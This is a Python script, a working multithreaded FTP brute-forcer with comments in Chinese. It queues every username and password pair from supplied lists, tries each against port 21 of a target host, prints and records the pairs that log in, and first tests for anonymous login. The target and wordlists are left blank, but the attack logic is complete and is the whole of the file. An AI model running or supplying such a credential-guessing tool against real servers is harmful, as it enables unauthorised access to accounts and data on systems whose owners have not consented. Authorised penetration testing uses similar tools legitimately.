import queue
import socket
import threading
import time
from ftplib import FTP
import  ftplib

def ftpScan(host,userList,pwList,qlist):
    threadnum = 10
    timeout = 10
    result = []
    for name in userList:
        for pwd in pwList:
            name = name.strip()
            pwd = pwd.strip()
            qlist.put(name + ':' + pwd)
    threads = []
    for x in range(1, threadnum + 1):
        t = threading.Thread(target=scan,args=(qlist,host,timeout,result))
        threads.append(t)
        t.setDaemon(True)  # 主线程完成后不管子线程有没有结束，直接退出
        t.start()


#可以开多个线程运行本函数
def scan(qlist,host,timeout,result):
    while not qlist.empty():
        name, pwd = qlist.get().split(':')
        try:
            ftp = FTP()
            ftp.connect(host, 21, timeout)
            ftp.login(name, pwd)
            time.sleep(0.05)
            ftp.quit()
            s = "[OK] %s  %s:%s" % (host,name, pwd)
            print(s)
            result.append({"username": name, "password": pwd})
        except socket.timeout as e:
            print(host+ " Timeout...")
            qlist.put(name + ':' + pwd)
            time.sleep(1)
        except Exception as e:
            error = "[Error] %s:%s" % (name, pwd)
            print(error)
            pass

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', '')
        print('\n[*] ' + str(hostname) \
        + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as  e:
        print('\n[-] ' + str(hostname) + \
        ' FTP Anonymous Logon Failed.')
        return False

if __name__ == "__main__":
    host=""
    userList=[]
    pwList=[]
    qlist = queue.Queue()
    anonLogin(host)# 先试一试匿名登录
    ftpScan(host, userList, pwList,qlist)
    try:
        while True:
            if qlist.empty():
                break
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        print("Exit the program...")